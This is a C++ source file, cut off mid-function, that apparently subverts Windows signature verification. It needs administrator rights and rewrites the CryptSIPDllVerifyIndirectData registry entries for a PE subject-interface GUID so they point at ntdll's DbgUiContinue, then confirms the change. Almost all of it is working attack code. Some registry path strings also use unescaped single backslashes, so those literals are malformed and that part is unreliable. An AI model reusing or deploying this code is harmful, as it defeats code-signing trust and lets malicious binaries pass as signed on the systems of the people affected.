#include <Windows.h>
#include <iostream>
#include <string>

bool IsAdmin() {
BOOL isAdmin = FALSE;
PSID adminGroup = NULL;
SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup);
CheckTokenMembership(NULL, adminGroup, &isAdmin);
FreeSid(adminGroup);
return isAdmin == TRUE;
}

bool IsWindows64Bit() {
SYSTEM_INFO si;
GetNativeSystemInfo(&si);
return (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64);
}

const wchar_t* REG_PATH = L"SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}";
const wchar_t* REG_PATH32 = L"SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}";

bool SetRegistryHook(const wchar_t* subkey) {
HKEY hKey;
LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, subkey, 0, NULL, REG_OPTION_NON_VOLATILE,
KEY_SET_VALUE, NULL, &hKey, NULL);
if (result != ERROR_SUCCESS) {
std::wcerr << L"[ERROR] Failed to create key: " << result << std::endl;
return false;
}

const wchar_t* dllPath = L"C:\\Windows\\System32\\ntdll.dll";  
const wchar_t* funcName = L"DbgUiContinue";  
  
result = RegSetValueExW(hKey, L"Dll", 0, REG_SZ, (const BYTE*)dllPath,   
                        (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));  
if (result != ERROR_SUCCESS) {  
    std::wcerr << L"[ERROR] Failed to set Dll: " << result << std::endl;  
    RegCloseKey(hKey);  
    return false;  
}  
  
result = RegSetValueExW(hKey, L"FuncName", 0, REG_SZ, (const BYTE*)funcName,   
                        (DWORD)((wcslen(funcName) + 1) * sizeof(wchar_t)));  
if (result != ERROR_SUCCESS) {  
    std::wcerr << L"[ERROR] Failed to set FuncName: " << result << std::endl;  
    RegCloseKey(hKey);  
    return false;  
}  
  
RegCloseKey(hKey);  
return true;

}

bool VerifyHook(const wchar_t* subkey) {
HKEY hKey;
wchar_t dllValue[MAX_PATH] = {0};
wchar_t funcValue[MAX_PATH] = {0};
DWORD size = sizeof(dllValue);

LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey, 0, KEY_QUERY_VALUE, &hKey);  
if (result != ERROR_SUCCESS) return false;  
  
result = RegQueryValueExW(hKey, L"Dll", NULL, NULL, (BYTE*)dllValue, &size);  
if (result != ERROR_SUCCESS || wcsstr(dllValue, L"ntdll.dll") == NULL) {  
    RegCloseKey(hKey);  
    return false;  
}  
  
size = sizeof(funcValue);  
result = RegQueryValueExW(hKey, L"FuncName", NULL, NULL, (BYTE*)funcValue, &size);  
RegCloseKey(hKey);  
  
return (result == ERROR_SUCCESS && wcsstr(funcValue, L"DbgUiContinue") != NULL);

}

void TouchFile(const std::wstring& path) {
HANDLE hFile = CreateFileW(path.c_str(),
